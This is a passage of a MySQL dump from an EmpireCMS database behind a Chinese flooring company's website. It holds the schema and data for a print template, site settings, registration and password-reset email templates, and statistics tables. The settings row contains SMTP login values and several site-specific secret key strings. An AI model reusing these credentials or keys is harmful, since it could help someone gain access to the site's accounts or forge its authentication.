/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspostserver`
--

LOCK TABLES `libang_enewspostserver` WRITE;
/*!40000 ALTER TABLE `libang_enewspostserver` DISABLE KEYS */;
INSERT INTO `libang_enewspostserver` VALUES (1,'附件服务器','',1,'','','','','',0,0,0,0,0);
/*!40000 ALTER TABLE `libang_enewspostserver` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsprinttemp`
--

DROP TABLE IF EXISTS `libang_enewsprinttemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsprinttemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(60) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  `showdate` varchar(50) NOT NULL DEFAULT '',
  `modid` smallint(6) NOT NULL DEFAULT '0',
  PRIMARY KEY (`tempid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsprinttemp`
--

LOCK TABLES `libang_enewsprinttemp` WRITE;
/*!40000 ALTER TABLE `libang_enewsprinttemp` DISABLE KEYS */;
INSERT INTO `libang_enewsprinttemp` VALUES (1,'默认打印模板','<html>\r\n<head>\r\n<meta http-equiv=\\\"content-type\\\" content=\\\"text/html; charset=utf-8\\\">\r\n<title>[!--pagetitle--] - Powered by EmpireCMS</title>\r\n<meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n<meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n<style>\r\nbody{font-family:宋体}td,.f12{font-size:12px}.f24 {font-size:24px;}.f14 {font-size:14px;}.title14 {font-size:14px;line-height:130%}.l17 {line-height:170%;}\r\n</style>\r\n</head>\r\n<body bgcolor=\\\"#ffffff\\\" topmargin=5 leftmargin=5 marginheight=5 marginwidth=5 onLoad=\\\'window.print()\\\'>\r\n<center>\r\n<table width=650 border=0 cellspacing=0 cellpadding=0>\r\n<tr>\r\n<td height=65 width=180><A href=\\\"http://www.phome.net/\\\"><IMG src=\\\"../../skin/default/images/elogo.jpg\\\" alt=\\\"帝国软件\\\" width=\\\"180\\\" height=\\\"65\\\" border=0></A></td> \r\n<td valign=\\\"bottom\\\">[!--url--]</td>\r\n<td width=\\\"83\\\" align=\\\"right\\\" valign=\\\"bottom\\\"><a href=\\\'javascript:history.back()\\\'>返回</a>　<a href=\\\'javascript:window.print()\\\'>打印</a></td>\r\n</tr>\r\n</table>\r\n<table width=650 border=0 cellpadding=0 cellspacing=20 bgcolor=\\\"#EDF0F5\\\">\r\n<tr>\r\n<td>\r\n<BR>\r\n<TABLE cellSpacing=0 cellPadding=0 width=\\\"100%\\\" border=0>\r\n<TBODY>\r\n<TR>\r\n<TH class=\\\"f24\\\"><FONT color=#05006c>[!--title--]</FONT></TH></TR>\r\n<TR>\r\n<TD>\r\n<HR SIZE=1 bgcolor=\\\"#d9d9d9\\\">\r\n</TD>\r\n</TR>\r\n<TR>\r\n<TD align=\\\"middle\\\" height=20><div align=\\\"center\\\">[!--writer--]&nbsp;&nbsp;[!--newstime--]&nbsp;&nbsp;[!--befrom--]</div></TD>\r\n</TR>\r\n<TR>\r\n<TD height=15></TD>\r\n</TR>\r\n<TR>\r\n<TD class=\\\"l17\\\">\r\n<FONT class=\\\"f14\\\" id=\\\"zoom\\\"> \r\n<P>[!--newstext--]<br>\r\n<BR clear=all>\r\n</P>\r\n</FONT>\r\n</TD>\r\n</TR>\r\n<TR height=10>\r\n<TD></TD>\r\n</TR>\r\n</TBODY>\r\n</TABLE>\r\n[!--titlelink--]\r\n</td>\r\n</tr>\r\n</table>\r\n</center>\r\n</body>\r\n</html>',1,'Y-m-d H:i:s',1);
/*!40000 ALTER TABLE `libang_enewsprinttemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspublic`
--

DROP TABLE IF EXISTS `libang_enewspublic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspublic` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `newsurl` varchar(120) NOT NULL DEFAULT '',
  `sitename` varchar(60) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `filetype` text NOT NULL,
  `filesize` int(11) NOT NULL DEFAULT '0',
  `hotnum` tinyint(4) NOT NULL DEFAULT '0',
  `newnum` tinyint(4) NOT NULL DEFAULT '0',
  `relistnum` int(11) NOT NULL DEFAULT '0',
  `renewsnum` int(11) NOT NULL DEFAULT '0',
  `min_keyboard` tinyint(4) NOT NULL DEFAULT '0',
  `max_keyboard` tinyint(4) NOT NULL DEFAULT '0',
  `search_num` tinyint(4) NOT NULL DEFAULT '0',
  `search_pagenum` tinyint(4) NOT NULL DEFAULT '0',
  `newslink` tinyint(4) NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `searchtime` int(11) NOT NULL DEFAULT '0',
  `loginnum` smallint(6) NOT NULL DEFAULT '0',
  `logintime` int(11) NOT NULL DEFAULT '0',
  `addnews_ok` tinyint(1) NOT NULL DEFAULT '0',
  `register_ok` tinyint(1) NOT NULL DEFAULT '0',
  `indextype` varchar(10) NOT NULL DEFAULT '',
  `goodlencord` tinyint(4) NOT NULL DEFAULT '0',
  `goodtype` varchar(10) NOT NULL DEFAULT '',
  `goodnum` tinyint(4) NOT NULL DEFAULT '0',
  `searchtype` varchar(10) NOT NULL DEFAULT '',
  `exittime` smallint(6) NOT NULL DEFAULT '0',
  `smalltextlen` smallint(6) NOT NULL DEFAULT '0',
  `defaultgroupid` smallint(6) NOT NULL DEFAULT '0',
  `fileurl` varchar(255) NOT NULL DEFAULT '',
  `phpmode` tinyint(1) NOT NULL DEFAULT '0',
  `ftphost` varchar(255) NOT NULL DEFAULT '',
  `ftpport` varchar(20) NOT NULL DEFAULT '21',
  `ftpusername` varchar(120) NOT NULL DEFAULT '',
  `ftppassword` varchar(120) NOT NULL DEFAULT '',
  `ftppath` varchar(255) NOT NULL DEFAULT '',
  `ftpmode` tinyint(1) NOT NULL DEFAULT '0',
  `install` tinyint(1) NOT NULL DEFAULT '0',
  `hotplnum` tinyint(4) NOT NULL DEFAULT '0',
  `softversion` varchar(30) NOT NULL DEFAULT '0',
  `lctime` int(11) NOT NULL DEFAULT '0',
  `dorepnum` smallint(6) NOT NULL DEFAULT '0',
  `loadtempnum` smallint(6) NOT NULL DEFAULT '0',
  `firstnum` tinyint(4) NOT NULL DEFAULT '0',
  `bakdbpath` varchar(50) NOT NULL DEFAULT '',
  `bakdbzip` varchar(50) NOT NULL DEFAULT '',
  `downpass` varchar(32) NOT NULL DEFAULT '',
  `min_userlen` tinyint(4) NOT NULL DEFAULT '0',
  `max_userlen` tinyint(4) NOT NULL DEFAULT '0',
  `min_passlen` tinyint(4) NOT NULL DEFAULT '0',
  `max_passlen` tinyint(4) NOT NULL DEFAULT '0',
  `filechmod` tinyint(1) NOT NULL DEFAULT '0',
  `tid` smallint(6) NOT NULL DEFAULT '0',
  `tbname` varchar(60) NOT NULL DEFAULT '',
  `loginkey_ok` tinyint(1) NOT NULL DEFAULT '0',
  `limittype` tinyint(1) NOT NULL DEFAULT '0',
  `redodown` smallint(6) NOT NULL DEFAULT '0',
  `candocode` tinyint(1) NOT NULL DEFAULT '0',
  `opennotcj` tinyint(1) NOT NULL DEFAULT '0',
  `reuserpagenum` int(11) NOT NULL DEFAULT '0',
  `revotejsnum` int(11) NOT NULL DEFAULT '0',
  `readjsnum` int(11) NOT NULL DEFAULT '0',
  `qaddtran` tinyint(1) NOT NULL DEFAULT '0',
  `qaddtransize` int(11) NOT NULL DEFAULT '0',
  `ebakthisdb` tinyint(1) NOT NULL DEFAULT '0',
  `delnewsnum` int(11) NOT NULL DEFAULT '0',
  `markpos` tinyint(4) NOT NULL DEFAULT '0',
  `markimg` varchar(80) NOT NULL DEFAULT '',
  `marktext` varchar(80) NOT NULL DEFAULT '',
  `markfontsize` varchar(12) NOT NULL DEFAULT '',
  `markfontcolor` varchar(12) NOT NULL DEFAULT '',
  `markfont` varchar(80) NOT NULL DEFAULT '',
  `adminloginkey` tinyint(1) NOT NULL DEFAULT '0',
  `php_outtime` int(11) NOT NULL DEFAULT '0',
  `listpagefun` varchar(36) NOT NULL DEFAULT '',
  `textpagefun` varchar(36) NOT NULL DEFAULT '',
  `adfile` varchar(30) NOT NULL DEFAULT '',
  `notsaveurl` text NOT NULL,
  `jstempid` smallint(6) NOT NULL DEFAULT '0',
  `rssnum` smallint(6) NOT NULL DEFAULT '0',
  `rsssub` smallint(6) NOT NULL DEFAULT '0',
  `savetxtf` text NOT NULL,
  `dorepdlevelnum` int(11) NOT NULL DEFAULT '0',
  `listpagelistfun` varchar(36) NOT NULL DEFAULT '',
  `listpagelistnum` smallint(6) NOT NULL DEFAULT '0',
  `infolinknum` int(11) NOT NULL DEFAULT '0',
  `searchgroupid` smallint(6) NOT NULL DEFAULT '0',
  `opencopytext` tinyint(1) NOT NULL DEFAULT '0',
  `reuserjsnum` int(11) NOT NULL DEFAULT '0',
  `reuserlistnum` int(11) NOT NULL DEFAULT '0',
  `opentitleurl` tinyint(1) NOT NULL DEFAULT '0',
  `qaddtranimgtype` text NOT NULL,
  `qaddtranfile` tinyint(1) NOT NULL DEFAULT '0',
  `qaddtranfilesize` int(11) NOT NULL DEFAULT '0',
  `qaddtranfiletype` text NOT NULL,
  `sendmailtype` tinyint(1) NOT NULL DEFAULT '0',
  `smtphost` varchar(255) NOT NULL DEFAULT '',
  `fromemail` varchar(120) NOT NULL DEFAULT '',
  `loginemail` tinyint(1) NOT NULL DEFAULT '0',
  `emailusername` varchar(60) NOT NULL DEFAULT '',
  `emailpassword` varchar(60) NOT NULL DEFAULT '',
  `smtpport` varchar(20) NOT NULL DEFAULT '',
  `emailname` varchar(120) NOT NULL DEFAULT '',
  `deftempid` smallint(6) NOT NULL DEFAULT '0',
  `feedbacktfile` tinyint(1) NOT NULL DEFAULT '0',
  `feedbackfilesize` int(11) NOT NULL DEFAULT '0',
  `feedbackfiletype` text NOT NULL,
  `searchtempvar` tinyint(1) NOT NULL DEFAULT '0',
  `showinfolevel` smallint(6) NOT NULL DEFAULT '0',
  `navfh` varchar(20) NOT NULL DEFAULT '',
  `spicwidth` smallint(6) NOT NULL DEFAULT '0',
  `spicheight` smallint(6) NOT NULL DEFAULT '0',
  `spickill` tinyint(1) NOT NULL DEFAULT '0',
  `jpgquality` tinyint(4) NOT NULL DEFAULT '0',
  `markpct` tinyint(4) NOT NULL DEFAULT '0',
  `redoview` smallint(6) NOT NULL DEFAULT '0',
  `reggetfen` smallint(6) NOT NULL DEFAULT '0',
  `regbooktime` smallint(6) NOT NULL DEFAULT '0',
  `revotetime` smallint(6) NOT NULL DEFAULT '0',
  `nreclass` text NOT NULL,
  `nreinfo` text NOT NULL,
  `nrejs` text NOT NULL,
  `fpath` tinyint(1) NOT NULL DEFAULT '0',
  `filepath` varchar(30) NOT NULL DEFAULT '',
  `openmembertranimg` tinyint(1) NOT NULL DEFAULT '0',
  `memberimgsize` int(11) NOT NULL DEFAULT '0',
  `memberimgtype` text NOT NULL,
  `openmembertranfile` tinyint(1) NOT NULL DEFAULT '0',
  `memberfilesize` int(11) NOT NULL DEFAULT '0',
  `memberfiletype` text NOT NULL,
  `nottobq` text NOT NULL,
  `defspacestyleid` smallint(6) NOT NULL DEFAULT '0',
  `canposturl` text NOT NULL,
  `openspace` tinyint(1) NOT NULL DEFAULT '0',
  `defadminstyle` smallint(6) NOT NULL DEFAULT '0',
  `realltime` smallint(6) NOT NULL DEFAULT '0',
  `closeip` text NOT NULL,
  `openip` text NOT NULL,
  `hopenip` text NOT NULL,
  `closewords` text NOT NULL,
  `closewordsf` text NOT NULL,
  `textpagelistnum` smallint(6) NOT NULL DEFAULT '0',
  `memberlistlevel` smallint(6) NOT NULL DEFAULT '0',
  `wapopen` tinyint(1) NOT NULL DEFAULT '0',
  `wapdefstyle` smallint(6) NOT NULL DEFAULT '0',
  `wapshowmid` varchar(255) NOT NULL DEFAULT '',
  `waplistnum` tinyint(4) NOT NULL DEFAULT '0',
  `wapsubtitle` tinyint(4) NOT NULL DEFAULT '0',
  `wapshowdate` varchar(50) NOT NULL DEFAULT '',
  `wapchar` tinyint(1) NOT NULL DEFAULT '0',
  `ebakcanlistdb` tinyint(1) NOT NULL DEFAULT '0',
  `paymoneytofen` int(11) NOT NULL DEFAULT '0',
  `payminmoney` int(11) NOT NULL DEFAULT '0',
  `keytog` tinyint(1) NOT NULL DEFAULT '0',
  `keyrnd` varchar(60) NOT NULL DEFAULT '',
  `keytime` int(11) NOT NULL DEFAULT '0',
  `regkey_ok` tinyint(1) NOT NULL DEFAULT '0',
  `opengetdown` tinyint(1) NOT NULL DEFAULT '0',
  `gbkey_ok` tinyint(1) NOT NULL DEFAULT '0',
  `fbkey_ok` tinyint(1) NOT NULL DEFAULT '0',
  `newaddinfotime` smallint(6) NOT NULL DEFAULT '0',
  `classnavline` smallint(6) NOT NULL DEFAULT '0',
  `classnavfh` varchar(120) NOT NULL DEFAULT '',
  `adminstyle` text NOT NULL,
  `sitekey` varchar(255) NOT NULL DEFAULT '',
  `siteintro` text NOT NULL,
  `docnewsnum` int(11) NOT NULL DEFAULT '0',
  `openschall` tinyint(1) NOT NULL DEFAULT '0',
  `schallfield` tinyint(1) NOT NULL DEFAULT '0',
  `schallminlen` tinyint(4) NOT NULL DEFAULT '0',
  `schallmaxlen` tinyint(4) NOT NULL DEFAULT '0',
  `schallnotcid` text NOT NULL,
  `schallnum` smallint(6) NOT NULL DEFAULT '0',
  `schallpagenum` smallint(6) NOT NULL DEFAULT '0',
  `dtcanbq` tinyint(1) NOT NULL DEFAULT '0',
  `dtcachetime` int(11) NOT NULL DEFAULT '0',
  `regretime` smallint(6) NOT NULL DEFAULT '0',
  `regclosewords` text NOT NULL,
  `regemailonly` tinyint(1) NOT NULL DEFAULT '0',
  `repkeynum` smallint(6) NOT NULL DEFAULT '0',
  `getpasstime` int(11) NOT NULL DEFAULT '0',
  `acttime` int(11) NOT NULL DEFAULT '0',
  `regacttype` tinyint(1) NOT NULL DEFAULT '0',
  `acttext` text NOT NULL,
  `getpasstext` text NOT NULL,
  `acttitle` varchar(120) NOT NULL DEFAULT '',
  `getpasstitle` varchar(120) NOT NULL DEFAULT '',
  `opengetpass` tinyint(1) NOT NULL DEFAULT '0',
  `hlistinfonum` int(11) NOT NULL DEFAULT '0',
  `qlistinfonum` int(11) NOT NULL DEFAULT '0',
  `dtncanbq` tinyint(1) NOT NULL DEFAULT '0',
  `dtncachetime` int(11) NOT NULL DEFAULT '0',
  `readdinfotime` smallint(6) NOT NULL DEFAULT '0',
  `qeditinfotime` int(11) NOT NULL DEFAULT '0',
  `ftpssl` tinyint(1) NOT NULL DEFAULT '0',
  `ftppasv` tinyint(1) NOT NULL DEFAULT '0',
  `ftpouttime` smallint(6) NOT NULL DEFAULT '0',
  `onclicktype` tinyint(1) NOT NULL DEFAULT '0',
  `onclickfilesize` int(11) NOT NULL DEFAULT '0',
  `onclickfiletime` int(11) NOT NULL DEFAULT '0',
  `schalltime` smallint(6) NOT NULL DEFAULT '0',
  `defprinttempid` smallint(6) NOT NULL DEFAULT '0',
  `opentags` tinyint(1) NOT NULL DEFAULT '0',
  `tagstempid` smallint(6) NOT NULL DEFAULT '0',
  `usetags` text NOT NULL,
  `chtags` text NOT NULL,
  `tagslistnum` smallint(6) NOT NULL DEFAULT '0',
  `closeqdt` tinyint(1) NOT NULL DEFAULT '0',
  `settop` tinyint(1) NOT NULL DEFAULT '0',
  `qlistinfomod` tinyint(1) NOT NULL DEFAULT '0',
  `gb_num` tinyint(4) NOT NULL DEFAULT '0',
  `member_num` tinyint(4) NOT NULL DEFAULT '0',
  `space_num` tinyint(4) NOT NULL DEFAULT '0',
  `opendoip` text NOT NULL,
  `closedoip` text NOT NULL,
  `doiptype` varchar(255) NOT NULL DEFAULT '',
  `filelday` int(11) NOT NULL DEFAULT '0',
  `infolday` int(11) NOT NULL DEFAULT '0',
  `baktempnum` tinyint(4) NOT NULL DEFAULT '0',
  `dorepkey` tinyint(1) NOT NULL DEFAULT '0',
  `dorepword` tinyint(1) NOT NULL DEFAULT '0',
  `onclickrnd` varchar(20) NOT NULL DEFAULT '',
  `indexpagedt` tinyint(1) NOT NULL DEFAULT '0',
  `keybgcolor` varchar(8) NOT NULL DEFAULT '',
  `keyfontcolor` varchar(8) NOT NULL DEFAULT '',
  `keydistcolor` varchar(8) NOT NULL DEFAULT '',
  `indexpageid` smallint(6) NOT NULL DEFAULT '0',
  `closeqdtmsg` varchar(255) NOT NULL DEFAULT '',
  `openfileserver` tinyint(1) NOT NULL DEFAULT '0',
  `closemods` varchar(255) NOT NULL DEFAULT '',
  `fieldandtop` tinyint(1) NOT NULL DEFAULT '0',
  `fieldandclosetb` text NOT NULL,
  `filedatatbs` text NOT NULL,
  `filedeftb` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closelisttemp` varchar(255) NOT NULL DEFAULT '',
  `chclasscolor` varchar(8) NOT NULL DEFAULT '',
  `timeclose` varchar(255) NOT NULL DEFAULT '',
  `timeclosedo` varchar(255) NOT NULL DEFAULT '',
  `ipaddinfonum` int(10) unsigned NOT NULL DEFAULT '0',
  `ipaddinfotime` smallint(5) unsigned NOT NULL DEFAULT '0',
  `rewriteinfo` varchar(120) NOT NULL DEFAULT '',
  `rewriteclass` varchar(120) NOT NULL DEFAULT '',
  `rewriteinfotype` varchar(120) NOT NULL DEFAULT '',
  `rewritetags` varchar(120) NOT NULL DEFAULT '',
  `closehmenu` varchar(80) NOT NULL DEFAULT '',
  `indexaddpage` tinyint(1) NOT NULL DEFAULT '0',
  `rewritepl` varchar(150) NOT NULL DEFAULT '',
  `modmemberedittran` tinyint(1) NOT NULL DEFAULT '0',
  `modinfoedittran` tinyint(1) NOT NULL DEFAULT '0',
  `php_adminouttime` int(11) NOT NULL DEFAULT '0',
  `httptype` tinyint(1) NOT NULL DEFAULT '0',
  `qinfoaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `bakescapetype` tinyint(1) NOT NULL DEFAULT '0',
  `hkeytime` int(11) NOT NULL DEFAULT '0',
  `hkeyrnd` varchar(60) NOT NULL DEFAULT '',
  `mhavedatedo` tinyint(1) NOT NULL DEFAULT '0',
  `reportkey` tinyint(1) NOT NULL DEFAULT '0',
  `wapchstyle` tinyint(1) NOT NULL DEFAULT '0',
  `usetotalnum` tinyint(1) NOT NULL DEFAULT '0',
  `spacegids` varchar(255) NOT NULL DEFAULT '',
  `candocodetag` tinyint(1) NOT NULL DEFAULT '0',
  `openern` varchar(255) NOT NULL DEFAULT '',
  `ernurl` varchar(200) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspublic`
--

LOCK TABLES `libang_enewspublic` WRITE;
/*!40000 ALTER TABLE `libang_enewspublic` DISABLE KEYS */;
INSERT INTO `libang_enewspublic` VALUES (1,'/','南充市丽邦装饰工程有限公司','admin@phome.net','|.png|.gif|.jpg|.swf|.rar|.zip|.mp3|.wmv|.txt|.doc|',2048,10,10,8,100,2,20,20,10,0,0,30,5,60,1,0,'.html',0,'',10,'.html',40,160,1,'/d/file/',0,'','21','','','',0,0,10,'7.5,1502985610',1222406370,300,50,10,'bdata','zip','YxposdvkeP1Nlvc1hFgB',3,20,6,20,1,1,'news',0,0,1,1,0,50,100,100,1,50,1,300,5,'../data/mark/maskdef.gif','','5','','../data/mark/cour.ttf',1,0,'sys_ShowListPage','sys_ShowTextPage','thea','',1,50,300,',article.newstext,',300,'sys_ShowListMorePage',10,100,0,0,100,8,1,'|.gif|.jpg|',1,500,'|.zip|.rar|',1,'smtp.163.com','ecms@163.com',1,'ecms','ecms','25','帝国CMS',0,1,500,'|.zip|.rar|',1,2,'>',105,118,1,80,65,24,0,30,30,',6,12,13,14,',',',',',2,'',1,50,'|.gif|.jpg|',1,500,'|.zip|.rar|',',',1,'',1,1,0,'','','','','',6,2,0,1,'',10,30,'m-d',2,0,10,1,2,'tNqDblX5bnZtod8WEHnIBi15ySfPf8To',900,0,0,0,0,0,20,'&nbsp;|&nbsp;',',1,2,','南充市丽邦装饰工程有限公司','南充市丽邦装饰工程有限公司，是一家集设计、营销、安装、客服、施工团队为一体，为客户提供一站式服务的专业品牌的康体企业，一直致力于打造“你的满意我们的无限动力”的品牌形象，专注的态度，专业的技术，严谨的全方位的跟踪服务，竭尽所能为用户提供更多、更好、更完善的地坪工程。\r\n我们一贯十分重视工程质量，注重施工队伍的建设，拥有各种场地经验的工程技术人员，而且还引进了专业的施工机械设备，使工程建设队伍无论在技术质量还是技术装备方面，都有着无法比拟的优势，经过各类工程的锤炼，目前公司施工队伍有着丰富的施工经验和较强的技术实力，完全有能力完成各类型场地的施工。\r\n公司拥有先进的生产基地和设施完备的实验中心。主要产品有：环氧自流坪，环氧砂浆地坪，环氧薄涂地坪，车库交通设施，塑胶跑道，硅PU球场，丙烯酸球场，以及环氧树脂玻纤地板、环氧树脂防静电地板、环氧防腐地板、水性环氧地板、 PVC塑胶地板,全钢防静电地板、透水地板、艺术地板、金刚砂耐磨地板及化学腐蚀的防腐处理等。产品主要应用于：精密仪器、食品工间、烟草、光学生物制品、学校、商场、车场等领域。 \r\n公司努力传播先进涂装理念，积极参与行业标准的制定，始终以材料技术、涂装工艺创新作为企业生存与发展的动力，在产品研发，施工工艺上孜孜以求，不断推出具有自主知识产权的核心技术。\r\n丽邦用心为顾客提供优质产品和专业化的技术服务，积极推崇绿色环保产品，树立企业的社会责任形象，是工业地坪系统方案的解决专家，领先的产品品质及优质的服务使丽邦在行业内有着卓著的口碑和业绩。',300,0,1,3,20,',,',20,10,1,43200,0,'',1,0,72,720,0,'[!--username--] ，\r\n这封信是由 [!--sitename--] 发送的。\r\n\r\n您收到这封邮件，是因为在我们网站的新用户注册 Email 使用\r\n了您的地址。如果您并没有访问过我们的网站，或没有进行上述操作，请忽\r\n略这封邮件。您不需要退订或进行其他进一步的操作。\r\n\r\n----------------------------------------------------------------------\r\n帐号激活说明\r\n----------------------------------------------------------------------\r\n\r\n您是我们网站的新用户，注册 Email 时使用了本地址，我们需\r\n要对您的地址有效性进行验证以避免垃圾邮件或地址被滥用。\r\n\r\n您只需点击下面的链接即可激活您的帐号：\r\n\r\n[!--pageurl--]\r\n\r\n(如果上面不是链接形式，请将地址手工粘贴到浏览器地址栏再访问)\r\n\r\n感谢您的访问，祝您使用愉快！\r\n\r\n\r\n\r\n此致\r\n\r\n[!--sitename--] 管理团队.\r\n[!--news.url--]','[!--username--] ，\r\n这封信是由 [!--sitename--] 发送的。\r\n\r\n您收到这封邮件，是因为在我们的网站上这个邮箱地址被登记为用户邮箱，\r\n且该用户请求使用 Email 密码重置功能所致。\r\n\r\n----------------------------------------------------------------------\r\n重要！\r\n----------------------------------------------------------------------\r\n\r\n如果您没有提交密码重置的请求或不是我们网站的注册用户，请立即忽略\r\n并删除这封邮件。只在您确认需要重置密码的情况下，才继续阅读下面的\r\n内容。\r\n\r\n----------------------------------------------------------------------\r\n密码重置说明\r\n----------------------------------------------------------------------\r\n\r\n您只需在提交请求后的三天之内，通过点击下面的链接重置您的密码：\r\n\r\n[!--pageurl--]\r\n\r\n(如果上面不是链接形式，请将地址手工粘贴到浏览器地址栏再访问)\r\n\r\n上面的页面打开后，输入新的密码后提交，之后您即可使用新的密码登录\r\n网站了。您可以在用户控制面板中随时修改您的密码。\r\n\r\n\r\n\r\n此致\r\n\r\n[!--sitename--] 管理团队.\r\n[!--news.url--]','[[!--sitename--]] Email 地址验证','[[!--sitename--]] 取回密码说明',0,30,25,1,43200,60,0,0,0,0,0,10,60,0,1,1,1,',1,2,3,4,5,6,7,8,','',25,0,0,0,20,20,25,'','','',0,0,3,0,0,'',0,'','','',0,'',0,',error,gb,fb,',0,'',',1,',1,'','99C4E3','','',0,0,'','','','','',0,'',0,0,1000,0,0,1,30,'nByemLsYR0IK85IDm4eseWIzxRgv6bOIpf7N',0,0,0,0,'',0,'','');
/*!40000 ALTER TABLE `libang_enewspublic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspublic_fc`
--

DROP TABLE IF EXISTS `libang_enewspublic_fc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspublic_fc` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `fclastindex` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspublic_fc`
--

LOCK TABLES `libang_enewspublic_fc` WRITE;
/*!40000 ALTER TABLE `libang_enewspublic_fc` DISABLE KEYS */;
INSERT INTO `libang_enewspublic_fc` VALUES (1,1600655823);
/*!40000 ALTER TABLE `libang_enewspublic_fc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspublic_up`
--

DROP TABLE IF EXISTS `libang_enewspublic_up`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspublic_up` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `lasttimeinfo` int(10) unsigned NOT NULL DEFAULT '0',
  `lasttimepl` int(10) unsigned NOT NULL DEFAULT '0',
  `lastnuminfo` int(10) unsigned NOT NULL DEFAULT '0',
  `lastnumpl` int(10) unsigned NOT NULL DEFAULT '0',
  `lastnuminfotb` text NOT NULL,
  `lastnumpltb` text NOT NULL,
  `todaytimeinfo` int(10) unsigned NOT NULL DEFAULT '0',
  `todaytimepl` int(10) unsigned NOT NULL DEFAULT '0',
  `todaynuminfo` int(10) unsigned NOT NULL DEFAULT '0',
  `yesterdaynuminfo` int(10) unsigned NOT NULL DEFAULT '0',
  `todaynumpl` int(10) unsigned NOT NULL DEFAULT '0',
  `yesterdaynumpl` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspublic_up`
--

LOCK TABLES `libang_enewspublic_up` WRITE;
/*!40000 ALTER TABLE `libang_enewspublic_up` DISABLE KEYS */;
INSERT INTO `libang_enewspublic_up` VALUES (1,1355124469,1355124476,183,0,'|1,183|','',1646371010,1646371010,6,0,0,0);
/*!40000 ALTER TABLE `libang_enewspublic_up` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspublicadd`
--

DROP TABLE IF EXISTS `libang_enewspublicadd`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspublicadd` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `ctimeopen` tinyint(1) NOT NULL DEFAULT '0',
  `ctimelast` int(10) unsigned NOT NULL DEFAULT '0',
  `ctimeindex` int(11) NOT NULL DEFAULT '0',
  `ctimeclass` int(11) NOT NULL DEFAULT '0',
  `ctimelist` int(11) NOT NULL DEFAULT '0',
  `ctimetext` int(11) NOT NULL DEFAULT '0',
  `ctimett` int(11) NOT NULL DEFAULT '0',
  `ctimetags` int(11) NOT NULL DEFAULT '0',
  `ctimegids` varchar(255) NOT NULL DEFAULT '',
  `ctimecids` varchar(255) NOT NULL DEFAULT '',
  `ctimernd` varchar(60) NOT NULL DEFAULT '',
  `ctimeaddre` tinyint(4) NOT NULL DEFAULT '0',
  `ctimeqaddre` tinyint(4) NOT NULL DEFAULT '0',
  `autodoopen` tinyint(1) NOT NULL DEFAULT '0',
  `autodouser` varchar(30) NOT NULL DEFAULT '',
  `autodopass` varchar(32) NOT NULL DEFAULT '',
  `autodosalt` varchar(20) NOT NULL DEFAULT '',
  `autodoshowkey` tinyint(1) NOT NULL DEFAULT '0',
  `autodotime` int(11) NOT NULL DEFAULT '0',
  `autodoline` int(11) NOT NULL DEFAULT '0',
  `autodovar` varchar(20) NOT NULL DEFAULT '',
  `autodoval` varchar(60) NOT NULL DEFAULT '',
  `autodoshow` tinyint(1) NOT NULL DEFAULT '0',
  `autodofile` tinyint(1) NOT NULL DEFAULT '0',
  `autodopostpass` varchar(120) NOT NULL DEFAULT '',
  `autodoss` tinyint(1) NOT NULL DEFAULT '0',
  `autodoaction` varchar(200) NOT NULL DEFAULT '',
  `autodock` tinyint(1) NOT NULL DEFAULT '0',
  `digglevel` int(11) NOT NULL DEFAULT '0',
  `diggcmids` varchar(255) NOT NULL DEFAULT '',
  `toqjf` text NOT NULL,
  `qtoqjf` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspublicadd`
--

LOCK TABLES `libang_enewspublicadd` WRITE;
/*!40000 ALTER TABLE `libang_enewspublicadd` DISABLE KEYS */;
